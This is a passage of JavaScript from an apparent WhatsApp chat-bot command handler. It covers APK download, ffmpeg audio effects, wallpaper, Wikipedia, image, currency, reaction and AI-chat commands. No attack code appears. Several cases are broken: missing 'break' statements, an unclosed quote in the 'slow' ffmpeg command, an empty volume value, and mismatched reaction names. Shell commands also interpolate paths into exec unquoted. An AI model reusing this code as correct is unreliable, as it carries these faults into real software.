    if (!appName) {
        return reply("*Please provide an app name.\n\nExample: .apk whatsapp*");
    }
    
    try {
        await conn.sendPresenceUpdate('composing', from);
        
        const apiUrl = `https://api.princetechn.com/api/download/apkdl?apikey=prince&appName=${encodeURIComponent(appName)}`;
        const { data } = await axios.get(apiUrl, { timeout: 15000 });
        
        if (data && data.success && data.result) {
            const result = data.result;
            const apkUrl = result.download_url;
            
            await conn.sendMessage(from, { 
                document: { url: apkUrl },
                mimetype: 'application/vnd.android.package-archive',
                fileName: `${result.appname}.apk`,
                caption: `📱 *${result.appname}*\n👨‍💻 Developer: ${result.developer}`
            }, { quoted: m });
        } else {
            reply(`APK for "${appName}" not found.`);
        }
    } catch (error) {
        console.error('APK error:', error.message);
        reply("Error fetching APK. Please try again later!");
    }
    
}
break
case 'bass': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=54:width_type=o:width=2:g=20 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case "blown": {
  try {
  const quoted = m.quoted ? m. 
  quoted : null;
  const mime = quoted?.
  mimetype || "";
  if (!quoted || !/audio/.test(mime)) {
    return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af atempo=4/4,asetrate=44500*2/3 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'earrape': {
try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af volume=12 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case "volaudio": {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to adjust volume.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -filter:a volume= ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'treble': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=10000:width_type=o:width=2:g=15 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'fast': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.5" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'slow': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath}  -filter:a "atempo=0.8 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'reverse': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "areverse" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'echo': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "aecho=0.8:0.9:1000:0.3" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'robot': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'deep': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*0.7,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'chipmunk': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*1.5,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'nightcore': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.06,asetrate=44100*1.25" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'instrumental': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to extract instrumental.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Using the karaoke filter to remove vocals (center channel removal)
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=c1,aresample=async=1:first_pts=0" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'vocalremove': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to remove vocals.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // More advanced vocal removal technique
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=-1*c1" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'karaoke': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to create karaoke version.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different approach to vocal removal
    exec(`ffmpeg -i ${mediaPath} -af "stereotools=mode=ms>lr" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'wallpaper':
case 'wall': { 
const query = args.join(" ");
    if (!query) {
        return reply("Please provide a search query.\n\nExample: .wallpaper Sunset Scenes");
    }
    
    try {
        await conn.sendPresenceUpdate('composing', from);
        
        const apiUrl = `https://api.princetechn.com/api/search/wallpaper?apikey=prince&query=${encodeURIComponent(query)}`;
        const { data } = await axios.get(apiUrl, { timeout: 15000 });
        
        if (data && data.success && data.results && data.results.length > 0) {
            const randomIndex = Math.floor(Math.random() * data.results.length);
            const wallpaper = data.results[randomIndex];
            const imageUrl = wallpaper.image[0];
            
            const caption = `🖼️ *Wallpaper*\n\n📌 *Type:* ${wallpaper.type}\n🔍 *Search:* ${query}`;
            
            await conn.sendMessage(from, {
                image: { url: imageUrl },
                caption: caption
            }, { quoted: m });
        } else {
            reply(`❌ No wallpapers found for "${query}".`);
        }
    } catch (error) {
        console.error('Wallpaper error:', error.message);
        reply("❌ Error fetching wallpaper. Please try again later!");
    }
    
}
break
case "wikipedia":
case "wiki": {    
    if (!text) return reply("📌 *Enter a search query.*\n\nExample: .wikipedia Elon Musk");

    try {
        const apiUrl = `https://api.princetechn.com/api/search/wikimedia?apikey=prince&title=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl, { timeout: 15000 });
        
        if (data && data.success && data.results) {
            const result = data.results;
            const imageUrl = result.originalImage?.source || result.thumbnail?.source;
            
            const caption = `📌 *Title:* ${result.title}\n\n📝 *Description:* ${result.description || 'No description available'}\n\n📖 *Extract:* ${result.extract || 'No extract available'}\n\n🔗 *Source:* ${result.pageUrl}\n📅 *Last Modified:* ${result.lastModified || 'Unknown'}`;
            
            if (imageUrl) {
                await conn.sendMessage(m.chat, {
                    image: { url: imageUrl },
                    caption: caption
                }, { quoted: m });
            } else {
                reply(caption);
            }
        } else {
            reply(`❌ *No Wikipedia results found for "${text}".*`);
        }
    } catch (error) {
        console.error('Wikipedia error:', error.message);
        reply("❌ *An error occurred while fetching Wikipedia results.*");
    }
    
}
break
case "remini": {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted) return reply("📌 *Send or reply to an image.*");
    if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);

    try {
        await reply("*Enhancing image... Please wait.*");
        const imageUrl = await handleMediaUpload(quoted, conn, mime);
        
        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
            return reply("*Failed to upload image. Try again.*");
        }
        
        const reminiUrl = `https://apis.davidcyril.name.ng/remini?url=${encodeURIComponent(imageUrl)}`;
        const response = await axios.get(reminiUrl, {
            responseType: 'arraybuffer'
        });
        
        // Send the enhanced image directly
        await conn.sendMessage(m.chat, { 
            image: Buffer.from(response.data), 
            caption: "✅ *Image enhanced successfully!*" 
        }, { quoted: m });
        
    } catch (error) {
        console.error('Remini error:', error);
        reply("❌ *An error occurred while enhancing the image.*");
    }
   
}
break
case 'editimage':
case 'imageedit':
case 'nanobanana': {
    if (!m.quoted) return reply(`Reply to an image with: ${prefix}editimage make her hair blue`);

    const mime = m.quoted.mimetype || m.quoted.msg?.mimetype;
    if (!/image/.test(mime)) return reply(`Please reply to an image.`);

    const prompt = args.join(" ");
    if (!prompt) return reply(`Example: ${prefix}editimage make her hair blue`);

    try {
        await reply(`Editing image with prompt: "${prompt}"...`);

        // Use handleMediaUpload to upload image
        const imageUrl = await handleMediaUpload(m.quoted, conn, mime);
        
        if (!imageUrl || imageUrl.includes('exceeds the limit')) {
            return reply(`Failed to upload image. Try again.`);
        }

        const apiUrl = `https://apis.davidcyril.name.ng/nanobanana?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(prompt)}`;
        const response = await axios.get(apiUrl);

        if (!response.data?.success || !response.data?.result?.image) {
            return reply(`Failed to edit image.`);
        }

        await conn.sendMessage(m.chat, {
            image: { url: response.data.result.image },
            caption: `✅ Edited: ${prompt}\n> ${global.wm}`
        }, { quoted: m });

    } catch (error) {
        console.error('Edit image error:', error.message);
        reply(`Error: ${error.message}`);
    }
    
}
break
case "currency":
case "convert":
case "cur": {
    if (!text) return reply(`📌 *Currency Converter*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample:\n${prefix}convert 100 USD EUR\n${prefix}convert 50 GBP JPY\n${prefix}cur 1000 UGX KES`);

    const args = text.trim().split(/\s+/);
    if (args.length < 3) {
        return reply(`❌ *Invalid format!*\n\nUsage: ${prefix}convert <amount> <from> <to>\n\nExample: ${prefix}convert 100 USD EUR`);
    }

    const amount = parseFloat(args[0]);
    const from = args[1].toUpperCase();
    const to = args[2].toUpperCase();

    if (isNaN(amount)) {
        return reply(`*Invalid amount!*\n\nPlease provide a valid number.\nExample: ${prefix}convert 100 USD EUR`);
    }

    try {
        await reply(`*Converting ${amount} ${from} to ${to}...*`);

        const apiUrl = `https://apis.davidcyril.name.ng/tools/convert?amount=${amount}&from=${from}&to=${to}`;
        const response = await axios.get(apiUrl);

        if (response.data?.success && response.data?.result) {
            reply(`💱 *Currency Conversion*\n\n${response.data.result}`);
        } else {
            reply(`*Conversion failed!*\n\nPlease check the currency codes.\nExample: ${prefix}convert 100 USD EUR`);
        }
    } catch (error) {
        console.error('Currency error:', error);
        reply(`*Error converting currency.*\nPlease try again later.`);
    }
  
}
break
case "currencies":
case "curlist":
case "listcur": {
    if (!Access) return reply(mess.owner);
    
    try {
        await reply("*Fetching currency list...*");
        
        const apiUrl = "https://apis.davidcyril.name.ng/tools/currencies";
        const response = await axios.get(apiUrl);
        
        if (response.data?.success && response.data?.currencies) {
            const currencies = response.data.currencies;
            
            // Format the list in chunks
            let message = `💱 *SUPPORTED CURRENCIES*\n\n📊 *Total:* ${currencies.length} currencies\n\n`;
            
            // Group currencies in rows of 8
            let line = "";
            for (let i = 0; i < currencies.length; i++) {
                line += `• ${currencies[i]}  `;
                if ((i + 1) % 8 === 0 || i === currencies.length - 1) {
                    message += line + "\n";
                    line = "";
                }
            }
            
            message += `\n📌 *Usage:* ${prefix}convert <amount> <from> <to>\n📌 *Example:* ${prefix}convert 100 USD EUR`;
            
            // Send message (split if too long)
            if (message.length > 4000) {
                const parts = message.match(/[\s\S]{1,4000}/g);
                for (const part of parts) {
                    await reply(part);
                }
            } else {
                await reply(message);
            }
        } else {
            reply("*Failed to fetch currency list.*");
        }
    } catch (error) {
        console.error('Currency list error:', error);
        reply("*Error fetching currency list.*\nPlease try again later.");
    }
    
}
break
case 'kiss':
case 'cium':
case 'beso':
await fetchReactionImage({ conn, m, reply, command: 'kiss' });
break;
case "cry": {
await fetchImageReaction({ conn, m, reply, command: 'cry' });
}
break
case "blush": {
await fetchReactionImage({ conn, m, reply, command: 'blush'});
}
break
case 'dance': {
await fetchReactionImage ({ conn, m, reply, command: 'dance'})
}
break
case "kill": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "hug": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "kick3": {
await fetchReactionImage ({ conn, m, reply, command: 'kick3'})
}
break
case "slap": {
await fetchReactionImage ({ conn, m, reply, command: 'slap'})
}
break
case "happy": {
await fetchReactionImage ({ conn, m, reply, command: 'happy'})
}
break
case 'bully': {
await fetchReactionImage ({ conn, m, reply, command: 'bully'})
}
break
case "pat":
case "headpat":
case "pet":
await fetchReactionImage({ conn, m, reply, command: 'pat' });
break;
case "poke":
case "pokes":
await fetchReactionImage({ conn, m, reply, command: 'poke' });
break;
case "smile":
case "smiling":
await fetchReactionImage({ conn, m, reply, command: 'smile' });
break;
case "wave":
case "waving":
case "bye":
await fetchReactionImage({ conn, m, reply, command: 'wave' });
break;
case "cuddle":
case "snuggle":
await fetchReactionImage({ conn, m, reply, command: 'cuddle' });
break;
case "highfive":
case "high-five":
case "hi5":
await fetchReactionImage({ conn, m, reply, command: 'highfive' });
break;
case "lick":
await fetchReactionImage({ conn, m, reply, command: 'lick' });
break;
case "bite":
case "biting":
await fetchReactionImage({ conn, m, reply, command: 'bite' });
break;
case "glomp":
case "tacklehug":
await fetchReactionImage({ conn, m, reply, command: 'glomp' });
break;
case "bonk":
case "hit":
await fetchReactionImage({ conn, m, reply, command: 'bonk' });
break;
case "yeet":
case "throw":
await fetchReactionImage({ conn, m, reply, command: 'yeet' });
break;
case "smug":
case "smirking":
await fetchReactionImage({ conn, m, reply, command: 'smug' });
break;
case "nom":
case "eat":
await fetchReactionImage({ conn, m, reply, command: 'nom' });
break;
case "sleepy":
case "sleep":
await fetchReactionImage({ conn, m, reply, command: 'sleepy' });
break;
case "facepalm":
case "palm":
await fetchReactionImage({ conn, m, reply, command: 'facepalm' });
break;
case "wink":
case "winking":
await fetchReactionImage({ conn, m, reply, command: 'wink' });
break;
case "shy":
case "shyness":
await fetchReactionImage({ conn, m, reply, command: 'shy' });
break;
case "stare":
case "staring":
await fetchReactionImage({ conn, m, reply, command: 'stare' });
break;
case "thinking":
case "think":
await fetchReactionImage({ conn, m, reply, command: 'thinking' });
break;
case "shoot":
case "gun":
await fetchReactionImage({ conn, m, reply, command: 'shoot' });
break;
case "run":
case "running":
await fetchReactionImage({ conn, m, reply, command: 'run' });
break;
case "shrug":
case "idk":
await fetchReactionImage({ conn, m, reply, command: 'shrug' });
break;
case "panic":
case "panicking":
await fetchReactionImage({ conn, m, reply, command: 'panic' });
break;
case "tease":
case "teasing":
await fetchReactionImage({ conn, m, reply, command: 'tease' });
break;
case "shiver":
case "cold":
await fetchReactionImage({ conn, m, reply, command: 'shiver' });
break;
case "bored":
case "boring":
await fetchReactionImage({ conn, m, reply, command: 'bored' });
break;
case "scream":
case "yell":
await fetchReactionImage({ conn, m, reply, command: 'scream' });
break;
case "pout":
case "sulking":
await fetchReactionImage({ conn, m, reply, command: 'pout' });
break;
case "handhold":
case "holdinghands":
await fetchReactionImage({ conn, m, reply, command: 'handhold' });
break;
case "spank":
case "spanking":
await fetchReactionImage({ conn, m, reply, command: 'spank' });
break;
case "tickle":
case "tickling":
await fetchReactionImage({ conn, m, reply, command: 'tickle' });
break;
case "cringe":
case "cringing":
await fetchReactionImage({ conn, m, reply, command: 'cringe' });
break;
case "party":
case "partying":
await fetchReactionImage({ conn, m, reply, command: 'party' });
break;
case "celebrate":
case "celebration":
await fetchReactionImage({ conn, m, reply, command: 'celebrate' });
break;
case "generate": {
if (!text) return reply(global.mess.notext);

    const api3Url = `https://api.gurusensei.workers.dev/dream?prompt=${encodeURIComponent(text)}`;
    try {
      await conn.sendMessage(m.chat, { image: { url: api3Url } }, { quoted: m });
    } catch (error) {
      console.error('Error generating image:', error);
      reply(mess.error);
    }
}
break
case 'gemini':
case 'geminai':
case 'gem':
    if (!text) return reply("*Please provide a question. Example: `.gemini Explain quantum physics*`");
    
    try {
        await reply("🤔 Thinking...");
        
        const response = await fetch(`${global.mess.siputzx}/api/ai/gemini?text=${encodeURIComponent(text)}&promptSystem=Act+as+a+helpful+assistant`);
        const data = await response.json();
        
        if (!data.status || !data.data?.response) {
            return reply("❌ Failed to get response from Gemini.");
        }
        
        reply(data.data.response);
        
    } catch (error) {
        console.error('Gemini error:', error);
        reply("❌ Error communicating with Gemini AI.");
    }
    break;
case 'glm':
case 'glm47':
case 'glmflash':
    if (!text) return reply("*Please provide a question. Example: `.glm Introduction to JavaScript*`");
    
    try {
        await reply("🤔 Thinking...");
        
        const response = await fetch(`${global.mess.siputzx}/api/ai/glm47flash?prompt=${encodeURIComponent(text)}&system=You+are+a+helpful+assistant&temperature=0.7`);
        const data = await response.json();
        
        if (!data.status || !data.data?.response) {
            return reply("*Failed to get response from GLM.*");
        }
        
        reply(data.data.response);
        
    } catch (error) {
        console.error('GLM error:', error);
        reply("*Error communicating with GLM AI*.");
    }
    break;
case 'phi2':
case 'phiai':
case 'phi':
    if (!text) return reply("*Please provide a question. Example: `.phi2 How are you*`");
    
    try {
        await reply("🤔 Thinking...");
        
        const response = await fetch(`${global.mess.siputzx}/api/ai/phi2?prompt=${encodeURIComponent(text)}&system=You+are+a+helpful+assistant&temperature=0.7`);
        const data = await response.json();
        
        if (!data.status || !data.data?.response) {
            return reply("*Failed to get response from PHI2*.");
        }
        
        reply(data.data.response);
        
    } catch (error) {
        console.error('PHI2 error:', error);
        reply("*Error communicating with PHI2 AI*.");
    }
 
break
case 'venice':
case 'vai': {
    await veniceAICommand(conn, m.chat, text, m);
    break;
}

case 'mistral': {
    await mistralAICommand(conn, m.chat, text, m);
    break;
}

case 'perplexity': {
    await perplexityAICommand(conn, m.chat, text, m);
    break;
}

case 'bard': {
    await bardAICommand(conn, m.chat, text, m);
    break;
}

case 'gpt4nano':
case 'gpt41nano': {
    await gpt4NanoAICommand(conn, m.chat, text, m);
    break;
}

case 'kelvinai': {
    await kelvinAICommand(conn, m.chat, text, m);
    break;
}

case 'claude': {
    await claudeAICommand(conn, m.chat, text, m);
    break;
}
case 'math':
case 'simplify': {
    if (!text) return reply(`Please provide a math expression to simplify.\n\nExample:\n${prefix}math 2^8\n${prefix}simplify (5+3)*2`);

    const expression = text.trim();
    
    // Send processing message
    await reply('Simplifying expression... Please wait...');
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
      
        const apiUrl = `https://apiskeith.top/math/simplify?expr=${encodeURIComponent(expression)}`;
        const response = await axios.get(apiUrl, { timeout: 10000 });
        
        // Check response
        if (!response.data?.status) {
            throw new Error('Invalid API response');
        }

        const result = response.data.result;
        
        // Format the response
        const replyMsg = `🧮 *Math Simplification*\n\n` +
                        `📝 *Expression:* ${response.data.expression}\n` +
                        `✅ *Result:* ${result}\n\n` +
                        `> ${global.wm}`;

        await conn.sendMessage(m.chat, { text: replyMsg }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Math API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = '❌ Failed to simplify expression. ';
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else {
            errorMsg += 'Please check your expression and try again.';
        }
        reply(errorMsg);
    }
    break;
}
case 'dictionary': {
    if (!text) return reply(`*Dictionary*\n\nPlease provide a word to define.\n\nExample:\n${prefix}dictionary cat\n${prefix}define hello\n${prefix}dict computer`);

    const word = text.trim().toLowerCase();
    
    // Send processing message
    await reply(`🔍 Searching definition for: *${word}*...`);
    await conn.sendMessage(m.chat, { react: { text: '📖', key: m.key } });

    try {
        // Call the dictionary API
        const apiUrl = `https://apiskeith.top/education/dictionary?q=${encodeURIComponent(word)}`;
        const response = await axios.get(apiUrl, { timeout: 15000 });
        
        // Check response
        if (!response.data?.status || !response.data?.result) {
            throw new Error('Invalid API response');
        }

        const data = response.data.result;
        
        // Format the dictionary entry
        let definitionText = `📖 *Dictionary: ${data.word}*\n\n`;
        
        // Add phonetics if available
        if (data.phonetics && data.phonetics.length > 0) {
            const pronunciation = data.phonetics.find(p => p.text) || data.phonetics[0];
            if (pronunciation.text) {
                definitionText += `🔊 *Pronunciation:* ${pronunciation.text}\n`;
            }
        }
        
        definitionText += `\n`;
        
        // Add meanings
        if (data.meanings && data.meanings.length > 0) {
            data.meanings.forEach((meaning, index) => {
                definitionText += `*${meaning.partOfSpeech.toUpperCase()}*\n`;
                
                if (meaning.definitions && meaning.definitions.length > 0) {
                    // Show first 3 definitions to avoid long messages
                    meaning.definitions.slice(0, 3).forEach((def, i) => {
                        definitionText += `${i+1}. ${def.definition}\n`;
                        
                        // Add example if available
                        if (def.example) {
                            definitionText += `   _\"${def.example}\"_\n`;
                        }
                    });
                    
                    if (meaning.definitions.length > 3) {
                        definitionText += `   *+${meaning.definitions.length - 3} more definitions*\n`;
                    }
                }
                
                // Add synonyms if available
                if (meaning.synonyms && meaning.synonyms.length > 0) {
                    definitionText += `   *Synonyms:* ${meaning.synonyms.slice(0, 5).join(', ')}`;
                    if (meaning.synonyms.length > 5) {
                        definitionText += ` +${meaning.synonyms.length - 5} more`;
                    }
                    definitionText += `\n`;
                }
                
                definitionText += `\n`;
            });
        }
        
        // Add source
        if (data.sourceUrls && data.sourceUrls.length > 0) {
            definitionText += `📚 *Source:* ${data.sourceUrls[0]}\n`;
        }
        
        // Check if message is too long and truncate if needed
        if (definitionText.length > 4000) {
            definitionText = definitionText.substring(0, 4000) + '\n\n_...definition truncated (too long)_';
        }

        await conn.sendMessage(m.chat, { text: definitionText }, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (error) {
        console.error('Dictionary API Error:', error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        let errorMsg = `❌ Could not find definition for "*${word}*". `;
        if (error.message.includes('timeout')) {
            errorMsg += 'Request timed out.';
        } else if (error.response?.status === 404) {
